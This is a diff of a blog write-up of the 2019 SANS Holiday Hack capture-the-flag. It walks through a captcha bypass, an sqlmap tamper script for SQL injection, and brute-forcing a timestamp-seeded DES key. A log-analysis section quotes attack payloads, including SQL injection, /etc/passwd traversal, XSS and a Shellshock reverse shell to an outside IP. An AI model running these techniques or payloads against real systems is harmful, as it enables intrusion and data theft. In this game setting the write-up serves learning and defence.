-Let's go back to the student's dorm, and talk to Minty. She advises us to look at the talk on [optical decoding of keys](http://www.youtube.com/watch?v=KU6FJnbkeLA). I usually don't watch the talks (or I just quickly move forward to the part that seems most related to the challenge), but I'm happy I watched this one. It really made me realize that the "secret" encoded in a simple physical key is as simple as a couple of digits, and that a decent photo of it allows anybody to reproduce it.
+Let's go back to the student's dorm, and talk to Minty. She advises us to look at the talk on [optical decoding of keys](http://www.youtube.com/watch?v=KU6FJnbkeLA). I usually don't watch the talks (or I just quickly move forward to the part that seems most related to the challenge), but I'm happy I watched this one. It really made me realize that the "secret" encoded in a simple physical key is as simple as a couple of digits, and that a decent photo of the key allows anybody to reproduce it.
 
-Having watched this, we're now looking for a picture of the key of the door in Minty's closet. This was the hardest part of the challenge for me. I think I spent literally an hour walking around in the different areas, checking the different PNJ's avatars, until I realized that everytime you enter Minty's room, there's this weird elf who hops into the closet! If you already visited Minty's room, you'll probably need a hard refresh (Ctrl+Shift+R on Firefox Linux) to see [his avatar's url](https://2019.kringlecon.com/images/avatars/elves/krampus.png) in the network tab of the developer tools.
+Having watched this, we're now looking for a picture of the key for the door in Minty's closet. This was the hardest part of the challenge for me. I think I spent literally an hour walking around in the different areas, checking the different PNJ's avatars, until I realized that everytime you enter Minty's room, there's this weird elf who hops into the closet! If you already visited Minty's room, you'll probably need a hard refresh (Ctrl+Shift+R on Firefox Linux) to see [his avatar's url](https://2019.kringlecon.com/images/avatars/elves/krampus.png) in the network tab of the developer tools, when his avatar is fetched.
 
 Now that we have the picture, we just need to unleash our Gimp skills and to overlay the picture with [the Schlage decoding template](https://github.com/deviantollam/decoding/blob/master/Key%20Decoding/Decoding%20-%20Schlage.png):
 
 ![The decoded key](/assets/2020-01-14-2019-SANS-holiday-hack-challenge-write-up/decoded-key.png)
 
-Hence we can use the code *122520* to grind a copy of the key, and open the door to the steam tunnels!
+Neat! We can use the code *122520* to grind a copy of the key, and open the door to the steam tunnels!
 
 
 ## Bypassing the Frido Sleigh CAPTEHA
@@ -998,13 +1019,13 @@ Yes, finally a real red team challenge! Let's check the rules of this game:
 > * One lucky elf will be chosen at random every minute from now until contest end.
 > * So keep submitting as many times as it takes until you win!
 
-So the idea is quite clear; we want to submit as many applications as possible, in order to be selected as the lucky winner! But even applying once turns out to be difficult, due to the captcha: the captcha expects you to identify, among 100 pictures, the one belonging to 3 random categories, in less than 5 seconds! The real challenge here will be to work around this captcha.
+So the idea is quite clear; we want to submit as many applications as possible, in order to be selected as the lucky winner! But even applying once turns out to be difficult, due to the captcha: the captcha expects you to identify, among 100 pictures, the ones belonging to 3 random categories, in less than 5 seconds! The real challenge here will be to work around this captcha.
 
 To understand how the captcha mechanism works, the developer tools' network tab will once again be our best friend. We can see that, for each attempt:
-* a POST request is made to https://fridosleigh.com/api/capteha/request; the response contains a list of base64-encoded images, together with a random identifier for each image, and the names of the categories that must be identified by the end-user;
-* another POST request is sent to https://fridosleigh.com/api/capteha/submit, containing the identifiers of the pictures picked by the end-user.
+* a POST request is made to `https://fridosleigh.com/api/capteha/request`; the response contains a list of base64-encoded images, together with a random identifier for each image, and the names of the categories that must be identified by the end-user;
+* another POST request is sent to `https://fridosleigh.com/api/capteha/submit`, containing the identifiers of the pictures picked by the end-user.
 
-Something interesting to notice: there is no identifier, in the second request payload, that would allow the server to correlate it with the first request. In order to validate the response submitted in the second request, the server hence needs to rely on something else; and indeed, there's a session cookie resfreshed every time we ask for a new challenge. If you have a look at this cookie, and you may notice that it's a [JWT](https://jwt.io/) containing a blob of encrypted data. I would assume that this blob contains the list of uuids which are supposed to be picked by the end-user; upon receiving the second request, the server decrypts the session cookie and checks if the uuids submitted by the end-user match the ones in the cookie. This seems confirmed by the [captcha's documentation](https://fridosleigh.com/about_CAPTEHA.html):
+Something interesting to notice: there is no identifier, in the second request payload, that would allow the server to correlate it with the first request. In order to validate the response submitted in the second request, the server hence needs to rely on something else; and indeed, there's a session cookie refreshed every time we ask for a new challenge. If you have a look at this cookie, you may notice that it's a [JWT](https://jwt.io/) containing a blob of encrypted data. I would assume that this blob contains the list of uuids which are supposed to be picked by the end-user; upon receiving the second request, the server decrypts the session cookie and checks if the uuids submitted by the end-user match the ones in the cookie. This seems confirmed by the [captcha's documentation](https://fridosleigh.com/about_CAPTEHA.html):
 > You only need to solve the CAPTEHA challenge once per session and not for each and every subsequent HTTP request.
 
 Let's assume this encryption is correctly done for now, and try to crack the captcha using (as advised by Alabaster) some machine learning! The talk mentions in the hints points to a [GitHub-hosted project](https://github.com/chrisjd20/img_rec_tf_ml_demo) that seems to do almost what we need: it's classifying apples and bananas, and we want to classify Christmas trees and stockings.
@@ -1052,14 +1073,14 @@ print("Select types:" + str(all_select_types))
 # Select types:{'Presents', 'Candy Canes', 'Santa Hats', 'Stockings', 'Christmas Trees', 'Ornaments'}
 {% endhighlight %}
 
-Now we know that we have 6 distinct categories of images, and we have 500 examples. Let's pull the code in (https://github.com/chrisjd20/img_rec_tf_ml_demo), remove the apple and banana folders in `training_images`, and create folders for our 6 categories. Using a visual file editor, we can then head into the folder `unlabelled_images` we created before, and, for each category, pick at least 10 representants of this category, and move them into `img_rec_tf_ml_demo/<category>`.
+Now we know that we have 6 distinct categories of images, and we have 500 examples. Let's pull the code in [https://github.com/chrisjd20/img_rec_tf_ml_demo](https://github.com/chrisjd20/img_rec_tf_ml_demo), remove the apple and banana folders in `training_images`, and create folders for our 6 categories. Using a visual file explorer, we can then head into the folder `unlabelled_images` we created before, and, for each category, pick at least 10 representants of this category, and move them into `img_rec_tf_ml_demo/<category>`.
 
 That was the tedious part; now let's train our model (`python3 retrain.py --image_dir training_images/`) and relax!
 
 Once done, we need to adapt the script `predict_images_using_trained_model.py` to our needs. The original version tries to categorize the images located in the folder `unknown_images`. In our case, we want to:
 * request a challenge, by sending an HTTP POST request to `https://fridosleigh.com/api/capteha/request`
 * parse the response, decode the content, and submit each image to the classifier
-* select the uuids of the images that belong the the categories asked by the server, and send these uuids to `https://fridosleigh.com/api/capteha/submit`
+* select the uuids of the images that belong to the categories asked by the server, and send these uuids to `https://fridosleigh.com/api/capteha/submit`
 * we also need to send, in this second request, the cookie returned in the first response's headers (in Python, [requests' session](https://requests.readthedocs.io/en/master/user/advanced/#session-objects) can handle that for us)
 
 After implementing this, I was disappointed by the server's response to the second request:
@@ -1068,10 +1089,10 @@ After implementing this, I was disappointed by the server's response to the seco
 {"data":"Timed Out!","request":false}
 {% endhighlight %}
 
-You might not face this issue. But as you may remember, I'm doing everything from a virtual machine, and classifying 100 images takes from 8 to 12 seconds. Running it directly from a bare machine might be quick enough (especially if you manage to turn on [GPU acceleration](https://www.tensorflow.org/install/gpu)).
+You might not face this issue. But as you may remember, I'm doing everything from a virtual machine, and classifying 100 images takes from 8 to 12 seconds. Running it directly from a bare machine might be fast enough (especially if you manage to turn on [GPU acceleration](https://www.tensorflow.org/install/gpu)).
 
 I managed to work around this timing issue with the following optimizations in `predict_images_using_trained_model.py`:
-* I observed that classifying the first image takes much longer than the subsequent images. I assume tensorflow lazily initializes a few things the first time you submit an image to it. So I modified the code to classify a few images (from the set of labbeled images extracted before) as a warm-up, before requesting for the challenge
+* I observed that classifying the first image takes much longer than the subsequent images. I assume tensorflow lazily initializes a few things the first time you submit an image to it. So I modified the code to classify a random image (picked from the set of unlabelled images extracted before) as a warm-up, *before* requesting the challenge.
 * With a few tests, I also observed that the results must be sent less than 12 seconds after the challenge request has been sent. At the time I completed this challenge, this request could take up to 8 seconds to complete! (I don't know if that was due to the platform that was overloaded, or if the latency came from my internet connection). I knew that I needed at least 8 seconds to classify the images, so whenever it took more than 4 seconds to get a challenge, I discarded it and asked for a fresh one.
 
 With these two optimizations ([here's the final code](/assets/2020-01-14-2019-SANS-holiday-hack-challenge-write-up/fast.py)), we finally manage to pass the captcha. This means that now have a session cookie that we can use to spam submissions. Since there is one lucky draw per minute, you should receive your code by email within a few minutes after running the python script below:
@@ -1103,17 +1124,18 @@ while True:
 While visiting the student portal, it does not take long to observe that the [application form](https://studentportal.elfu.org/apply.php) seems to be vulnerable to SQL injection. Indeed, using a single quote in one of the fields will yield an error message that looks like this:
 
 > Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES (''test', 'test@test.com', 'test', 'test', 'test', 'test', 'pending')
+>
 > You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test', 'test@test.com', 'test', 'test', 'test', 'test', 'pending')' at line 2
 
-I'm so happy we'll be able to use [sqlmap](https://github.com/sqlmapproject/sqlmap)! In case you've never used it, this tool is really good at trying all kind of injections (including not obvious ones, such as time-based [blind injections](https://www.owasp.org/index.php/Blind_SQL_Injection)), and as soon as a vulnerability is found, it basically gives you an SQL shell.
+I'm so happy we'll be able to use [sqlmap](https://github.com/sqlmapproject/sqlmap)! In case you've never used it, this tool is really good at trying all kind of injections (including not obvious ones, such as time-based [blind injections](https://www.owasp.org/index.php/Blind_SQL_Injection)), and as soon as a vulnerability is found, it canbasically give you an SQL shell.
 
-Still, if we try it blindly on this form, it does not seem to find the SQL injection, even though we were able to spot it by inserting a dummy simple quote in one of our fields! So there must be something happening when we apply using our browser. Let's have a closer look at the content of the request sent by our browser, using the developer tools network tab:
+Still, if we try it blindly on this form, it does not seem to find the SQL injection, even though we were able to spot it by inserting a dummy simple quote in one of the fields! So there must be something happening when we apply using our browser, which is not happening when sqlmap probes for an injection. Let's have a closer look at the content of the request sent by our browser, using the developer tools network tab:
 
 {% highlight json %}
 {"Form data":{"name":"'test","elfmail":"test@test.com","program":"test","phone":"test","whyme":"test","essay":"test","token":"MTAwOTkxMjkxNzc2MTU3Nzk4ODkzNDEwMDk5MTI5MS43NzY=_MTI5MjY4ODUzNDczMjgzMjMxNzIxMzM2LjgzMg=="}}
 {% endhighlight %}
 
-Hmm, what's this token? There's no such token in the form we filled. If we look closely at the requests logged in the developer tools network tab, we can see that, just clicking on the form submission button, an HTTP GET request is sent to `https://studentportal.elfu.org/validator.php`, and the token is returned by the server. We can guess that this request is sent by some Javascript code executed when we submit the form. If we try to send an application request with a random token, or with an token generated a few seconds before, here's the error message returned by the server:
+Hmm, what's this token? There's no such token in the form we filled. If we look closely at the requests logged in the developer tools network tab, we can see that, just after clicking on the form submission button, an HTTP GET request is sent to `https://studentportal.elfu.org/validator.php`. This request returns a token, which is then sent together with the other form data in the application request. We can guess that this request is sent by some Javascript code executed when we submit the form. If we try to send an application request with a random token, or with an token generated a few seconds before, here's the error message returned by the server:
 
 > Invalid or expired token!
 
@@ -1146,8 +1168,8 @@ def tamper(payload, **kwargs):
     return payload
 {% endhighlight %}
 
-That's pretty close to what we want to do! As you can see, the function `tamper` returns `tamper` with no transformation, but adds a couple of dummy innocent parameters at the beginning of the request. It seems that some WAFs actually do not analyze more than a hundred parameters, so sqlmap can hide its sql injection in the last parameter!
-That's close to what we need; in our case, we want to append a (dynamically computed) parameter token. Here's our tamper script `elfu-student-tamper.py`
+That's pretty close to what we want to do! As you can see, in that example, the function `tamper` returns `tamper` with no transformation, but adds a couple of dummy innocent parameters at the beginning of the request. It seems that some WAFs actually do not analyze more than a hundred parameters, so sqlmap can hide its sql injection in the last parameter!
+That's close to what we need; in our case, we want to append a (dynamically computed) parameter token. Here's our tamper script `elfu-student-tamper.py`:
 
 {% highlight python %}
 from lib.core.enums import PRIORITY
@@ -1219,7 +1241,7 @@ Once again we can use our Gimp skills to patch the pieces together, and here's t
 >
 > For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen.
 
-This tool is a Windows executable file, but the good news is that it runs fine on [wine](https://www.winehq.org/). Launching the tool with no parameter with no arguments shows that there is an "unsecure" mode that uses plain-text HTTP in place of HTTPS, which will allow traffic inspection. So let's try that :)
+This tool is a Windows executable file, but the good news is that it runs fine on [wine](https://www.winehq.org/). Launching the tool with no parameter shows there is an "unsecure" mode that uses plain-text HTTP in place of HTTPS, hence allowing traffic inspection. So let's try that :)
 
 {% highlight bash %}
 $ echo "test" > test
@@ -1242,12 +1264,13 @@ Your secret id is a446fd8f-d255-411c-be8f-47cfe1fe4851 - Santa Says, don't share
 File successfully encrypted!
 {% endhighlight %}
 
-We can see (in Wireshark) that a POST request was sent to `http://elfscrow.elfu.org/api/store`, containing the key that was generated by the tool. In the response, the server returned a uuid, which is displayed by the tool as the "secret id". Unsurprisingly, when we try to decrypt the file, we are asked to provide the secret id; the tool sends the uuid to `http://elfscrow.elfu.org/api/retrieve`, and the server returns the key that was previously stored.
+We can see (in Wireshark) that a POST request was sent to `http://elfscrow.elfu.org/api/store`, containing the key that was generated by the tool. In the response, the server returned a uuid, which is displayed by the tool as the "secret id". Unsurprisingly, when we try to decrypt the file, we are asked to provide the secret id; the tool sends the uuid to `http://elfscrow.elfu.org/api/retrieve`, the server returns the key that was previously stored, and that key is used to decrypt the file.
 
-So the encryption key is generated by the tool, which uses the server as a simple database. We can't reasonably bruteforce our way in and try to fetch all keys from the server; the number of valid uuids is actually larger than the number of keys (as the generated key seem to be 8-bytes long), so it would actually be faster to bruteforce the key itself. So the client-server interaction won't be important in this challenge.
+So the encryption key is generated by the tool, which uses the server as a simple database. We can't reasonably bruteforce our way in and try to fetch all keys from the server; the number of valid uuids is actually larger than the number of keys (as the generated key seems to be 8-bytes long), so it would actually be faster to bruteforce the key itself. So the client-server interaction won't be important in this challenge.
 
-Instead, we need to look at how the key is generated. Let's have anoter look at the output of the encryption phase (which is necessarily the moment when the key is generated):
+Instead, we need to look at how the key is generated. Let's have another look at the output of the encryption phase (which is necessarily the moment when the key is generated):
 > Seed = 1577992840
+>
 > Generated an encryption key: 3f8f244ad43255a9 (length: 8)
 
 The key seems pretty small. The most popular block cipher algorithm are (from older to newer) DES, 3DES and AES, and only DES uses an 8-bytes long key. Running strings on the tool also gives some hints:
@@ -1258,10 +1281,10 @@ CryptImportKey failed for DES-CBC key
 CryptImportKey failed for DES-CBC key
 
 $ openssl des-cbc -d -in test.enc -K 3f8f244ad43255a9 -iv 0000000000000000 # Let's try to decrypt our "test" file
-test # Yeah :) DES-CBC is the algo we're lookin for
+test # Yeah :) DES-CBC is the algo we're looking for
 {% endhighlight %}
 
-The seed value might look familiar (or not) to you; it's actually the current [Unix epoch time](https://en.wikipedia.org/wiki/Unix_time). Since we know approximatively when the file was encrypted, we can easily iterate through all the Unix epoch times between between 7pm and 9pm UTC on December 6, 2019, derive the key for each of these timestamps, and try to decrypt the file for each of these keys. There are only 7200 seconds in the given timeframe, so we'll only have 7200 keys to try; that's pretty easy.
+The seed value might look familiar (or not) to you; it's actually the current [Unix epoch time](https://en.wikipedia.org/wiki/Unix_time). Since we know approximatively when the file was encrypted, we can easily iterate through all the Unix epoch times between between 7pm and 9pm UTC on December 6, 2019, derive the key for each of these timestamps, and try to decrypt the file for each of these keys. There are only 7200 seconds in the given timeframe, so we'll only have 7200 keys to try; that's definitely within our reach.
 
 We just need to know how to derive the key from the seed. Here we can try to decompile the tool (using the debug symbol to generate something human-readable) and locate the part that generates the key from the seed. After some googling, I found the decompiler [retdec](https://github.com/avast/retdec), which is free (and licensed under MIT license) and supports use of debug symbols:
 
@@ -1332,7 +1355,7 @@ def get_key(seed):
 print(get_key(1577992840)) # 3f8f244ad43255a9 - Yay!
 {% endhighlight %}
 
-As explained before, we now have all the needed pieces to decrypt our file; for any timestamp between `1575658800` and `1575666000`, we can generate the corresponding key and try to decrypt our file using this key. The python script below will output a lot of garbage, and finally leave you with the clear file `result_1575663650.pdf`:
+As explained before, we now have all the pieces needed to decrypt our file; for any timestamp between `1575658800` and `1575666000`, we can generate the corresponding key and try to decrypt our file using this key. The python script below will output a lot of garbage, and finally leave you with the clear file `result_1575663650.pdf`:
 
 {% highlight python %}
 # get_key defined as above
@@ -1353,7 +1376,7 @@ for timestamp in range(1575658800, 1575666000):
         pass
 {% endhighlight %}
 
-The encrypted file is a quick-start guide of the *Machine Learning Sleigh Route Finder*; check it out, that could be interesting.
+The secret file is a quick-start guide of the *Machine Learning Sleigh Route Finder*; check it out, that could be interesting.
 
 ## Open the Sleigh Shop Door
 
@@ -1365,25 +1388,25 @@ The next challenge is to break into [Shinny's crate](https://crate.elfu.org/), u
 
 I did this with Firefox, so the solution I'll give here might be slightly different in another browser.
 
-1. You don't need a clever riddle to open the console and scroll a little.
+1. *You don't need a clever riddle to open the console and scroll a little.*<br />
 Open the developer console, and scroll up to see the 8-characters code.
-2. Some codes are hard to spy, perhaps they'll show up on pulp with dye?
+2. *Some codes are hard to spy, perhaps they'll show up on pulp with dye?*<br />
 "Print" the webpage (Ctrl+P) in a PDF file and the code will be revealed near to the question.
-3. This code is still unknown; it was fetched but never shown.
+3. *This code is still unknown; it was fetched but never shown.*<br />
 Open the Network tab, and check the file which have been [fetched](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API). The file is fetched every minute, so if you have opened the network tab after the page initially loaded, you'll just have to wait for 1 minute before it shows up!
-4. Where might we keep the things we forage? Yes, of course: Local barrels!
+4. *Where might we keep the things we forage? Yes, of course: Local barrels!*<br />
 Look at the tab "Storage", and further down in the section "Local storage". You'll see an entry with the key 🛢️🛢️🛢️, and the value is the code.
-5. Did you notice the code in the title? It may very well prove vital.
+5. *Did you notice the code in the title? It may very well prove vital.*<br />
 The code's written at the end of the page's title; we can see the full title by just hovering the mouse cursor over the tab.
-6. In order for this hologram to be effective, it may be necessary to increase your perspective.
+6. *In order for this hologram to be effective, it may be necessary to increase your perspective.*<br />
 Right-click on the hologram, "Inspect this element", then increase the value of its [perspective](https://developer.mozilla.org/en-US/docs/Web/CSS/perspective) CSS attribute to something massive; this will display the code in the hologram.
-7. The font you're seeing is pretty slick, but this lock's code was my first pick.
-Right-click on the riddle's text, "Inspect this element", then have a look at the property [font-family](https://developer.mozilla.org/en-US/docs/Web/CSS/font-family): thie first font choice is the code.
-8. In the event that the .eggs go bad, you must figure out who will be sad.
+7. *The font you're seeing is pretty slick, but this lock's code was my first pick.*<br />
+Right-click on the riddle's text, "Inspect this element", then have a look at the property [font-family](https://developer.mozilla.org/en-US/docs/Web/CSS/font-family): the first font choice is the code.
+8. *In the event that the .eggs go bad, you must figure out who will be sad.*<br />
 Right-click on the word eggs, "Inspect this element", then click on the button "event" next to the `span` element in the HTML code, and have a look at the event listener's code: `() => window['VERONICA'] = 'sad'`
-9. This next code will be unredacted, but only when all the chakras are :active.
+9. *This next code will be unredacted, but only when all the chakras are :active.*<br />
 For each word in the riddle, click on it and hold the mouse button down; for some words, 1 or 2 characters will be displayed. Type them down in the same order you revealed them, and you'll have the code.
-10. Oh, no! This lock's out of commission! Pop off the cover and locate what's missing.
+10. *Oh, no! This lock's out of commission! Pop off the cover and locate what's missing.*<br />
 Right-click on the lock's cover, "Inspect this element"; then locate the `div` node which has the `cover` class in the DOM tree. Remove it (Right click > "Delete node"); this will reveal [the circuit board](https://crate.elfu.org/images/lock_inside.png), with the code written in the bottom-right corner.
 When you enter the code and try to unlock the lock, nothing happens. If you have a look at the javascript console, you'll see this error message:
 > Missing macaroni!
@@ -1392,7 +1415,7 @@ What the heck is that? Well, if you simply search for "macaroni" in the HTML doc
 {% highlight html %}
 <div class="component macaroni" data-code="A33"></div>
 {% endhighlight %}
-In the DOM view, drag-and-drop this div into the last lock (where the cover used to be), and validate it again. You'll then see another error message (*Missing cotton swab!*).
+In the DOM view, drag-and-drop this `div` into the last lock (where the cover used to be), and validate it again. You'll then see another error message (*Missing cotton swab!*).
 Repeat the same procedure with the swab, then the gnome, and you'll be done with this challenge!
 
 ## Filter Out Poisoned Sources of Weather Data
@@ -1400,17 +1423,17 @@ Repeat the same procedure with the swab, then the gnome, and you'll be done with
 >Use the data supplied in the [Zeek JSON logs](https://downloads.elfu.org/http.log.gz) to identify the IP addresses of attackers poisoning Santa's flight mapping software. [Block the 100 offending sources of information to guide Santa's sleigh through the attack](https://srf.elfu.org/). Submit the Route ID ("RID") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.
 
 After talking to Wunorse Openslae, we understand that this last challenge actually has two steps:
-* The first step is to manage to log into the [Sleigh Route Finder Admin Console]((https://srf.elfu.org/)
+* The first step is to manage to log into the [Sleigh Route Finder Admin Console](https://srf.elfu.org/)
 * The second step will be to identify the IP of attackers (there should be 100 IPs), and block them
 
-Wunorse advises us to use `jq` to go through the logs. I guess it's possible to complete this challenge only using `jq`, but as there will be some "complex" queries to do, I'd rather use a tool I know. So let's stick with `python` for this last challenge!
+Wunorse advises us to use `jq` to go through the logs. I guess it's possible to complete this challenge only using `jq`, but as there will be some "complex" queries to do, I'd rather use a tool I know. So let's stick with Python for this last challenge!
 
 After looking at the logs (and especially at the different values of the field `uri`), we can see roughly three different categories of requests:
 * people using an API (`uri` starts with `/api/weather`), to either GET or POST some weather data;
 * people trying to access random stuff (and receiving an HTTP status code 404 as a response)
 * people logging in or out, or accessing existing resources
 
-Another thing that might strike you quickly is that most of the IPs are used only once! As a first step, we'd like to get the logs of someone who managed to log-in, then to perform some actions. So we expect to see at least a couple of IPs with two requests (one to `/api/login`, and one to something else). Let's try to list the IPs used in several requests:
+Another thing that might strike you quickly is that most of the IPs are used only once! As a first step, we'd like to get the logs of someone who managed to log-in, then to perform some actions. So we expect to see at least a couple of IPs with two requests (one to `/api/login`, and one to something else). Let's try to list the IPs at least twice:
 
 {% highlight python %}
 import json
@@ -1433,19 +1456,19 @@ with open("http.log","r") as file:
 # IP used multiple times: 228.145.238.81
 {% endhighlight %}
 
-Wow! Only 2 IPs are used several times! If we look at the activity of the first IPs, you'll see that the first request is a GET to `/README.md`. This might ring a bell if you've carefully read the quick-start guide decrypted 2 challenges ago. In this file, we could read:
+Wow! Only 2 IPs are used several times! If we look at the activity of the first IP, we'll see that the first request is a GET to `/README.md`. This might ring a bell if you've carefully read the quick-start guide decrypted 2 challenges ago. In this file, we could read:
 
 > The default login credentials should be changed on startup and can be found in the readme in the ElfU Research Labs git repository
 
-The [readme file](https://srf.elfu.org/README.md) read by `42.103.246.130` is indeed the file mentioned in the quick-start guide, and of course the default login credentials are still valid! We can now log into the [Sleigh Route Finder Admin Console]((https://srf.elfu.org/) using the default login/password admin/924158F9522B3744F5FCD4D10FAC4356.
+The [readme file](https://srf.elfu.org/README.md) read by `42.103.246.130` is indeed the file mentioned in the quick-start guide, and of course the default login credentials are still valid! We can now log into the [Sleigh Route Finder Admin Console](https://srf.elfu.org/) using the default login/password admin/924158F9522B3744F5FCD4D10FAC4356.
 
 The second step is to identify the attackers' IPs. We were told by Wunorse that there are (at least) four different attack methods that can be found in the logs:
 * SQL injection: we can indeed see some events with suspicious field values, such as `"uri": "/api/weather?station_id=1' UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM xmas_users WHERE 1"`
-* Local file inclusion: similarily, we can see that some user tried access `/api/weather?station_id=\"/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`
+* Local file inclusion: similarily, we can see that some user tried to access `/api/weather?station_id=\"/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`
 * Cross-site scripting: the classic way to test for XSS flaws is to use the browser's [`alert`](https://developer.mozilla.org/en-US/docs/Web/API/Window/alert) function; and indeed, we can see a request sent to `/logout?id=<script>alert(1400620032)</script>&ref_a=avdsscanning\\\"><script>alert(1536286186)</script>`
 * Shellshock: we can also spot the infamous Shellshock payload `() { :; };` in a couple of requests; for instance, the one sent with user-agent `() { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1`
 
-So we indeed found some examples for each of these attack. Let's now try to scan all the logs, and apply some easy heuristics to identify the IP that have been used to send an attack. It's important not to look only at the field `uri`, but to look at all fields: most of the fields from zeek logs are extracted from client-controlled fields of the HTTP request, and we can expect attackers to try to inject malicious payload in any client-controlled field.
+So we indeed found some examples for each of these attacks. Let's now try to scan all the logs, and apply some easy heuristics to identify the IPs that have been used to send an attack. It's important not to look only at the field `uri`, but to look at all fields: most of the fields from zeek logs are extracted from client-controlled fields of the HTTP request, and we can expect attackers to try to inject malicious payload in any client-controlled field.
 
 {% highlight python %}
 import json
@@ -1512,18 +1535,19 @@ print("Summary: " + repr(attacks_by_type))
 
 So 62 distinct IPs were detected as potential attacker's IP. For each of these IPs, we log the request that was flagged as an attack; you can review them if you want, and you'll see that all of them are definitely attacks, i.e. we don't have false positives in this list.
 
-Still, we only have 62 addresses. Wunorse advised us to start from the events identified as malicious, and to pivot off other attributes in that event to find IPs using similar values. Among the other attributes, I first thought about the `uid`. According to [Zeek's documentation](https://docs.zeek.org/en/stable/examples/logs/#using-uids):
+Still, we only have 62 addresses. Wunorse advised us to start from the events identified as malicious, and to pivot off other attributes in theses events to find IPs using similar values. Among the other attributes, I first thought about the `uid`. According to [Zeek's documentation](https://docs.zeek.org/en/stable/examples/logs/#using-uids):
 > As a connection is processed by Zeek, a unique identifier is assigned to each session.
 
 I honestly don't know what is the "session" mentioned by Zeek's documentation. I would assume it's the TLS session, but I'm not 100% sure. In such a case, I would expect very few duplicates in the `uid` from our logs. But it turns out that if you list the UIDs used by attackers, and then flag as suspicious any IP that used one of these `uid`s, you'll end up with 719 suspicious IPs! So that's probably not the good field to pivot off. I don't know if that's due to the simulated data, or if I was just wrong about the meaning of this field though...
 
-Moving on, we can have a look at another field: the `user_agent`. When we look at the `user-agent` of some of the 62 identified malicious requests, we can spot some (more or less) subtle typos here and there:
+Moving on, we can have a look at another field: the `user_agent`. When we look at the `user_agent` of some of the 62 identified malicious requests, we can spot some (more or less) subtle typos here and there:
 * value: Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) (*no space between MSIE and its version number*)
 * Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N (*no -e at the end of "compatibl"*)
 * Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html) (*only one O in Goglebot*)
-Once again, I don't know how realistic this is though, but that may allow us to detect a few IPs that may use the same user-agents, and we'll flag them as suspicious as well.
 
-For that, we'll modify our previous script to keep track of the user-agent of the 62 first malicious requests, during the first scan of the logs. We'll then do a second scan, and whenever a request uses a user-agent that we've tracked during the first scan, we'll mark the request as suspicious.
+Once again, I don't know how realistic this is, but that may allow us to detect a few IPs which used the same user-agents, and to flag them as suspicious as well.
+
+For that, we'll modify our previous script to keep track of the user-agent of the 62 first malicious requests, during the first scan of the logs. We'll then do a second scan, and whenever a request uses a user-agent that we've tracked during the first scan, we'll mark the request as suspicious:
 
 {% highlight python %}
 import json
@@ -1595,9 +1619,9 @@ print("Summary: " + repr(attacks_by_type))
 
 143 IPs; that's too much. If we start looking at the new IPs that we flagged, we'll see that some of them actually use a genuine user-agent. We've indeed been too aggressive, and we oversaw the fact that some attackers might have used legit user-agents; we cannot blacklist a user-agent just because an attacker used it!
 
-In order to avoid blocking popular user-agents used by attacker, we'll add one final bit of code in our script:
-* During the first scan, we'll count the number of requests by user-agent
-* During the second scan, we'll only flag an IP as suspicious if it uses an user-agent used by an attacker, and only two IPs used this user-agent (including the attacker's IP that was already identified during the first scan)
+In order to avoid blocking popular user-agents used by attackers, we'll add one final bit of code in our script:
+* During the first scan, we'll count the number of requests by user-agent;
+* During the second scan, we'll only flag an IP as suspicious if it uses an user-agent used by an attacker, and only two IPs (including the attacker's IP that was already identified during the first scan) used this user-agent.
 
 Here's the final version of our script:
 
